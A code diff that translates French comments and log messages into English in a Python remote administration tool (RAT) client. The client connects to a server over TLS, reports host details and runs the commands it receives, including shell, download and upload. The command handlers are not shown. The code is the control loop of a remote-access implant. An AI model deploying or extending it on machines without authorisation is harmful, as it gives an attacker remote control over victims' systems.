@@ -1,9 +1,9 @@
 """
-Client RAT (agent) - Remote Administration Tool.
+RAT Client (agent) - Remote Administration Tool.
 
-Se connecte au serveur via une socket TCP chiffrée TLS.
-Exécute les commandes reçues et renvoie les résultats.
-Compatible Windows et Linux.
+Connects to the server via a TLS-encrypted TCP socket.
+Executes received commands and sends back the results.
+Compatible with Windows and Linux.
 """
 
 import platform
@@ -20,16 +20,16 @@ logger = setup_logger("client")
 
 
 # ---------------------------------------------------------------------------
-# Enregistrement
+# Registration
 # ---------------------------------------------------------------------------
 
 
 def build_registration_payload() -> dict[str, str]:
     """
-    Construit le message d'enregistrement envoyé au serveur à la connexion.
+    Builds the registration message sent to the server on connection.
 
     Returns:
-        dict: Payload avec hostname, OS et version.
+        dict: Payload with hostname, OS and release version.
     """
     return {
         "type": "register",
@@ -40,28 +40,28 @@ def build_registration_payload() -> dict[str, str]:
 
 
 # ---------------------------------------------------------------------------
-# Dispatch des commandes
+# Command dispatch
 # ---------------------------------------------------------------------------
 
 
 def handle_server_command(message: dict, conn: socket.socket) -> dict | None:
     """
-    Route une commande reçue du serveur vers la fonction appropriée.
+    Routes a command received from the server to the appropriate function.
 
-    Les commandes shell, download et upload gèrent leur propre
-    communication avec le serveur et retournent None.
+    Shell, download and upload commands handle their own
+    communication with the server and return None.
 
     Args:
-        message: Message décodé reçu du serveur.
-        conn: Socket TLS pour les commandes avec échanges multiples.
+        message: Decoded message received from the server.
+        conn: TLS socket for commands with multiple exchanges.
 
     Returns:
-        dict de réponse à envoyer au serveur, ou None si déjà géré.
+        Response dict to send to the server, or None if already handled.
     """
     from rat_project.client import client_actions_os as actions
 
     command = message.get("command")
-    logger.info("Commande reçue : %s", command)
+    logger.info("Command received: %s", command)
 
     if command == "sysinfo":
         return {"type": "command_result", "command": "sysinfo", "output": actions.get_system_info()}
@@ -118,21 +118,21 @@ def handle_server_command(message: dict, conn: socket.socket) -> dict | None:
         return None
 
     else:
-        logger.warning("Commande inconnue : %s", command)
-        return {"type": "command_result", "command": command or "unknown", "output": "Commande inconnue."}
+        logger.warning("Unknown command: %s", command)
+        return {"type": "command_result", "command": command or "unknown", "output": "Unknown command."}
 
 
 # ---------------------------------------------------------------------------
-# Boucle principale du client
+# Main client loop
 # ---------------------------------------------------------------------------
 
 
 def run_client() -> None:
     """
-    Point d'entrée du client RAT.
+    RAT client entry point.
 
-    Se connecte au serveur en TLS, envoie le message d'enregistrement,
-    puis attend et exécute les commandes en boucle.
+    Connects to the server over TLS, sends the registration message,
+    then waits for and executes commands in a loop.
     """
     ssl_context = create_client_ssl_context()
 
@@ -140,37 +140,37 @@ def run_client() -> None:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
             with ssl_context.wrap_socket(raw_socket, server_hostname=HOST) as client_socket:
                 client_socket.connect((HOST, PORT))
-                logger.info("Connecté au serveur %s:%s (TLS)", HOST, PORT)
+                logger.info("Connected to server %s:%s (TLS)", HOST, PORT)
 
-                # Enregistrement
+                # Registration
                 payload = build_registration_payload()
                 client_socket.sendall(encode_message(payload))
-                logger.info("Enregistrement envoyé : %s", payload)
+                logger.info("Registration sent: %s", payload)
 
-                # Accusé de réception
+                # Acknowledgement
                 data = client_socket.recv(4096)
                 ack = decode_message(data.decode("utf-8").strip())
-                logger.info("ACK reçu : %s", ack)
+                logger.info("ACK received: %s", ack)
 
-                # Boucle principale
+                # Main loop
                 while True:
                     data = client_socket.recv(65536)
 
                     if not data:
-                        logger.info("Serveur déconnecté.")
+                        logger.info("Server disconnected.")
                         break
 
                     server_message = decode_message(data.decode("utf-8").strip())
-                    logger.info("Message reçu : %s", server_message)
+                    logger.info("Message received: %s", server_message)
 
                     response = handle_server_command(server_message, client_socket)
 
                     if response is not None:
                         client_socket.sendall(encode_message(response))
-                        logger.info("Réponse envoyée pour : %s", response.get("command"))
+                        logger.info("Response sent for: %s", response.get("command"))
 
     except Exception as exc:
-        logger.exception("Erreur client : %s", exc)
+        logger.exception("Client error: %s", exc)
 
 
 if __name__ == "__main__":
